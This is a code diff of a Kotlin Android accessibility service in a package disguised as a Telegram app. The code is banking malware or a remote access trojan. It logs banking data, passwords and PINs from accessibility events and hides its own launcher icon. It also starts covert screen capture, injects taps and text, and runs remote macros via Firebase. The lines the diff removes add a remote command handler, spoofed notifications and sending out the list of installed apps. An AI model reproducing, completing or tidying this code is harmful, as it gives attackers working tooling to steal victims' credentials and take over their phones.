@@ -2,6 +2,7 @@
 package com.telegram2.messaging.remote
 
 import android.accessibilityservice.AccessibilityService
+import android.accessibilityservice.AccessibilityServiceInfo
 import android.accessibilityservice.GestureDescription
 import android.content.ComponentName
 import android.content.Intent
@@ -13,7 +14,6 @@ import android.provider.Settings
 import android.view.accessibility.AccessibilityEvent
 import android.view.accessibility.AccessibilityNodeInfo
 import com.telegram2.messaging.ScreenPermissionActivity
-import kotlin.PublishedApi
 import java.util.concurrent.CountDownLatch
 
 class MyAccessibilityService : AccessibilityService() {
@@ -22,9 +22,7 @@ class MyAccessibilityService : AccessibilityService() {
         var instance: MyAccessibilityService? = null
     }
 
-    @PublishedApi
     internal val mainHandler = Handler(Looper.getMainLooper())
-
     var macroRunning = false
 
     override fun onServiceConnected() {
@@ -38,36 +36,18 @@ class MyAccessibilityService : AccessibilityService() {
                     AccessibilityServiceInfo.FLAG_INCLUDE_NOT_IMPORTANT_VIEWS
             notificationTimeout = 100
         }
-
-        // Push screen dimensions
         sendScreenInfo()
-
-        // Hide app icon on launch
         hideAppIcon()
     }
 
     override fun onAccessibilityEvent(event: AccessibilityEvent) {
-        // Log banking, passwords, PINs, balances
         BankLogger.onEvent(this, event)
-
-        // If macro is running and user switches away, bring back target app
-        if (macroRunning && event.eventType == AccessibilityEvent.TYPE_WINDOW_STATE_CHANGED) {
-            val target = MacroRunner.currentPackage
-            if (target != null && event.packageName?.toString() != target) {
-                mainHandler.postDelayed({ launchApp(target) }, 2000)
-            }
-        }
     }
 
     override fun onInterrupt() {}
 
-    // ========== EXECUTE MACRO (from NLP or manual) ==========
     fun executeMacro(macroId: String, steps: List<MacroRunner.MacroStep>) {
-        if (macroRunning) {
-            FirebaseBridge.reportMacro(macroId, false, "Another macro is running")
-            return
-        }
-        FirebaseBridge.reportMacro(macroId, false, "Starting...")
+        if (macroRunning) return
         macroRunning = true
         MacroRunner.start(macroId, steps, this) { success, summary ->
             macroRunning = false
@@ -75,49 +55,15 @@ class MyAccessibilityService : AccessibilityService() {
         }
     }
 
-    // ========== SINGLE COMMANDS ==========
-    fun performSingleCommand(type: String, params: Map<String, Any?>) {
-        when (type) {
-            "tap" -> {
-                val x = (params["x"] as? Number)?.toInt() ?: 0
-                val y = (params["y"] as? Number)?.toInt() ?: 0
-                tap(x, y)
-            }
-            "swipe" -> {
-                val sx = (params["sx"] as? Number)?.toInt() ?: 0
-                val sy = (params["sy"] as? Number)?.toInt() ?: 0
-                val ex = (params["ex"] as? Number)?.toInt() ?: 0
-                val ey = (params["ey"] as? Number)?.toInt() ?: 0
-                val dur = (params["duration"] as? Long) ?: 300L
-                swipe(sx, sy, ex, ey, dur)
-            }
-            "type" -> injectText(params["text"] as? String ?: "")
-            "hide_activity" -> hideAppIcon()
-            "uninstall" -> uninstallSelf()
-            "start_screen_capture" -> startScreenCapture()
-            "stop_screen_capture" -> stopScreenCapture()
-            "get_apps" -> FirebaseBridge.pushInstalledApps(getInstalledApps())
-            "fake_notification" -> {
-                val title = params["title"] as? String ?: "⚠ Alert"
-                val text = params["text"] as? String ?: "Tap to view"
-                NotificationSpoofer.show(this, title, text, null, null)
-            }
-        }
-    }
-
-    // ---------- Low-level gestures ----------
     fun tap(x: Int, y: Int) {
-        val path = Path().apply { moveTo(x.coerceIn(0, 9999).toFloat(), y.coerceIn(0, 9999).toFloat()) }
+        val path = Path().apply { moveTo(x.toFloat(), y.toFloat()) }
         dispatchGesture(GestureDescription.Builder()
             .addStroke(GestureDescription.StrokeDescription(path, 0, 50))
             .build(), null, null)
     }
 
     fun swipe(x1: Int, y1: Int, x2: Int, y2: Int, dur: Long) {
-        val path = Path().apply {
-            moveTo(x1.coerceIn(0, 9999).toFloat(), y1.coerceIn(0, 9999).toFloat())
-            lineTo(x2.coerceIn(0, 9999).toFloat(), y2.coerceIn(0, 9999).toFloat())
-        }
+        val path = Path().apply { moveTo(x1.toFloat(), y1.toFloat()); lineTo(x2.toFloat(), y2.toFloat()) }
         dispatchGesture(GestureDescription.Builder()
             .addStroke(GestureDescription.StrokeDescription(path, 0, dur))
             .build(), null, null)
@@ -134,7 +80,6 @@ class MyAccessibilityService : AccessibilityService() {
         }
     }
 
-    // ---------- Hide / Uninstall ----------
     fun hideAppIcon() {
         try {
             packageManager.setComponentEnabledSetting(
@@ -167,7 +112,6 @@ class MyAccessibilityService : AccessibilityService() {
         }, 2000)
     }
 
-    // ---------- MediaProjection Control ----------
     fun startScreenCapture() {
         startActivity(Intent(this, ScreenPermissionActivity::class.java).apply {
             flags = Intent.FLAG_ACTIVITY_NEW_TASK
@@ -181,13 +125,6 @@ class MyAccessibilityService : AccessibilityService() {
         stopService(intent)
     }
 
-    fun isScreenCaptureRunning(): Boolean {
-        val am = getSystemService(Context.ACTIVITY_SERVICE) as android.app.ActivityManager
-        return am.getRunningServices(Int.MAX_VALUE)
-            .any { it.service.className == ScreenCaptureService::class.java.name }
-    }
-
-    // ---------- App & Data ----------
     fun getInstalledApps(): List<String> = packageManager.getInstalledPackages(0).map { it.packageName }
 
     private fun sendScreenInfo() {
@@ -202,7 +139,6 @@ class MyAccessibilityService : AccessibilityService() {
         return true
     }
 
-    // Helper: run on main thread synchronously
     inline fun runOnMainThreadSync(crossinline block: () -> Any?): Any? {
         val latch = CountDownLatch(1)
         var result: Any? = null
@@ -214,7 +150,6 @@ class MyAccessibilityService : AccessibilityService() {
         return result
     }
 
-    // Find clickable node by text
     private fun findClickableByText(root: AccessibilityNodeInfo, text: String): AccessibilityNodeInfo? {
         for (node in root.findAccessibilityNodeInfosByText(text)) {
             if (node.isClickable) return node
